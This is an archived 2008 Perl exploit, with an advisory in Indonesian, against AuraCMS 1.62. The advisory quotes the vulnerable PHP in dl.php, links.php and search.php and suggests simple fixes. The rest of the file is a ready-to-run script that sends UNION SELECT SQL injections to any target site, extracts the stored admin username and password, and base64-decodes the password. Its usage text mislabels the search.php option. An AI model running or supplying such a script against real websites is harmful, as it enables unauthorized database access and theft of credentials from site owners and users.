<html><head><title>AuraCMS 1.62 Multiple Remote SQL Injection Exploit</title></head><pre>#!/usr/bin/perl
#
# Indonesian Newhack Security Advisory
# ------------------------------------
# AuraCMS 1.62   Multiple Remote SQL Injection Exploit
# Waktu			:  Feb 15 2008 01:00PM
# Software		:  AuraCMS   
# Versi			:  1.62
# Vendor 		:  http://www.auracms.org/
#
# ------------------------------------
# Audit Oleh 		:  NTOS-Team
# Lokasi		:  Indonesia | http://newhack.org
# Penjelasan		:
# 
# =&gt; Kutu pada berkas /mod/dl.php
# --//--
#  8. 	$aksi=$_GET[aksi];	
#  9.	$laporan=$_GET[laporan];
# 10.	$kategori=$_GET[kategori]; if(!$kategori) $kategori=$_POST[kategori];
# 11.	$kid=$_GET[kid]; if(!$kid) $kid=$_POST[kid];
# 12.	$id=$_GET[id]; if(!$id) $id=$_POST[id];
# 13.	$submit=$_POST[submit];
# 14.	$mulai=$_GET[mulai];
# 15.	$hal=$_GET[hal];
# 16.	$brokens=$_GET[brokens];
# --//--
# 59.if ($aksi==&quot;lihat&quot;){
# 60.
# 61.$numresult = mysql_query(&quot;SELECT * FROM dl WHERE kid='$kid' AND tipe='aktif' ORDER BY id DESC&quot;);
# 62.
# 63.$jmlrec = mysql_num_rows($numresult);
# --//--
# jika magic_quotes_gpc = off pada server maka pengguna dapat memanipulasi pernyataan SQL secara remote pada variabel &quot;kid&quot;
# Contoh;
# http://site.korban/auracms162/index.php?pilih=dl&amp;mod=yes&amp;aksi=lihat&amp;kategori=&amp;kid=-9'[SQLI]
#
# =&gt; Kutu pada berkas /mod/links.php
# --//--
#  8.	$aksi=$_GET[aksi];
#  9.	$kategori=$_GET[kategori]; if(!$kategori) $kategori=$_POST[kategori];
# 10.	$kid=$_GET[kid]; if(!$kid) $kid=$_POST[kid];
# 11.	$id=$_GET[id]; if(!$id) $id=$_POST[id];
# 12.	$submit=$_POST[submit];
# 13.	$mulai=$_GET[mulai];
# 14.	$hal=$_GET[hal];
# 15.	$brokens=$_GET[brokens];
# 16.	$laporan=$_GET[laporan];
# --//--
# 59.if ($aksi==&quot;lihat&quot;){
# 60.
# 61.$numresult = mysql_query(&quot;SELECT * FROM links WHERE kid='$kid' AND tipe='aktif' ORDER BY id DESC&quot;);
# 62.
# 63.$jmlrec = mysql_num_rows($numresult);
# --//--
# jika magic_quotes_gpc = off pada server maka pengguna dapat memanipulasi pernyataan SQL secara remote pada variabel &quot;kid&quot;
# Contoh;
# http://site.korban/auracms162/index.php?pilih=links&amp;mod=yes&amp;aksi=lihat&amp;kategori=&amp;kid=-9'[SQLI]
#
# =&gt; Kutu pada berkas /search.php
# --//--
#  8. $query=$_GET[query];
# --//--
# 19.  	$perintah=&quot;SELECT * FROM artikel WHERE ((judul LIKE '%$query%' OR konten LIKE '%$query%' OR user LIKE '%$query%')AND publikasi=1)&quot;;
# 20.	$hasil=mysql_query($perintah, $koneksi_db);
# 21.	$jumlah1=mysql_numrows($hasil);
# 22.
# 23.	$perintah=&quot;SELECT * FROM halaman WHERE (judul LIKE '%$query%' OR konten LIKE '%$query%')&quot;;
# 24.	$hasil=mysql_query($perintah, $koneksi_db);
# 25. 	$jumlah2=mysql_numrows($hasil); 
# --//--
# jika magic_quotes_gpc = off pada server maka pengguna dapat memanipulasi pernyataan SQL secara remote pada variabel &quot;query&quot;
# Contoh;
# http://site.korban/index.php?query=t4mugel4p')[SQLI]&amp;pilih=search
# 
# =&gt; perbaikan sederhana
# pada berkas &quot;mod/dl.php&quot; dan &quot;mod/links.php&quot;
# ubah kode ;
# $kid=$_GET[kid]; if(!$kid) $kid=$_POST[kid];
# menjadi
# $kid=(int)$_GET[kid]; if(!$kid) $kid=(int)$_POST[kid];
# dan buat magic_quotes_gpc = on pada server
# pada berkas &quot;/search.php&quot; buat fungsi penyaringan &quot;query&quot; dan hidupkan magic_quotes_gpc
#  
# =&gt; Perhatian!
# &quot;Exploit ini dibuat untuk pembelajaran, pengetesan dan pembuktian dari apa yang kami pelajari&quot;
# Segela penyalahgunaan dan kerusakan yang diakibat dari exploit ini bukan tanggung jawab kami
# 
# =&gt;Newhack Technology, OpenSource &amp; Security
# ~ NTOS-Team-&gt;[fl3xu5,k1tk4t,opt1lc] ~ 
use LWP::UserAgent;
use Getopt::Long;
use MIME::Base64;

if(!$ARGV[2])
{
 print &quot;\n  |-------------------------------------------------------|&quot;;
 print &quot;\n  |            Indonesian Newhack Technology              |&quot;;
 print &quot;\n  |-------------------------------------------------------|&quot;;
 print &quot;\n  |  AuraCMS 1.62 Multiple Remote SQL Injection Exploit   |&quot;;
 print &quot;\n  |                Coded by NTOS-Team                     |&quot;;
 print &quot;\n  |-------------------------------------------------------|&quot;;
 print &quot;\n[!] &quot;;
 print &quot;\n[!] Exploit Berhasil jika magic_quotes_gpc = off pada server&quot;;
 print &quot;\n[!] Penggunaan : perl aura162sqli.pl [Site] [Path] [Option]&quot;;
 print &quot;\n[!] [Option] 1 = dl.php   |  2 = links.php | 2 = search.php &quot;;
 print &quot;\n[!] Contoh     : perl aura162sqli.pl localhost /aura162/ -o 1&quot;;
 print &quot;\n[!] &quot;;
 print &quot;\n&quot;;
 exit;
}
$site 		= $ARGV[0]; # Site Target
$path 		= $ARGV[1]; # Path direktori vKios

%options = ();
GetOptions(\%options, &quot;o=i&quot;,);
if($options{&quot;o&quot;} &amp;&amp; $options{&quot;o&quot;} == 1) 
{ 
$sql = &quot;http://&quot;.$site.$path.&quot;index.php?pilih=dl&amp;mod=yes&amp;aksi=lihat&amp;kategori=&amp;kid=-999'union+select+concat(0x74346d7520,user,0x20673074),0,0,concat(0x67656c347020,password,0x20673074),0,0,0,0,0,0%20from%20user+limit+0,1/*&quot;; 
}
if($options{&quot;o&quot;} &amp;&amp; $options{&quot;o&quot;} == 2) 
{ 
$sql = &quot;http://&quot;.$site.$path.&quot;index.php?pilih=links&amp;mod=yes&amp;aksi=lihat&amp;kategori=&amp;kid=-999'union+select+concat(0x74346d7520,user,0x20673074),0,0,concat(0x67656c347020,password,0x20673074),0,0,0,0,0,0%20from%20user+limit+0,1/*&quot;; 
}
if($options{&quot;o&quot;} &amp;&amp; $options{&quot;o&quot;} == 3) 
{ 
$sql = &quot;http://&quot;.$site.$path.&quot;index.php?query=1nj3ks1')union+select+0,concat(0x74346d7520,user,0x20673074),concat(0x67656c347020,password,0x20673074)+from+user+limit+0,1/*&amp;pilih=search&quot;; 
}

$www = new LWP::UserAgent;
print &quot;\n\n [!] Injeksi SQL \n&quot;;
$res = $www -&gt; get($sql) or err();
$hasil = $res -&gt; content;
if( $hasil =~ /t4mu (.*?) g0t/ )
{ 
print &quot;\n [+] Username      : $1&quot;; 
$hasil =~ /gel4p (.*?) g0t/ , print &quot;\n [+] Password      : $1&quot;; 
print &quot;\n [+] base64 decode : &quot;; print decode_base64($1); print &quot;\n\n&quot;
} 
else 
{ 
print &quot;\n [-] Exploit gagal ;) - magic_quotes_gpc = on&quot;;
exit();
}

# milw0rm.com [2008-02-16]</pre></html>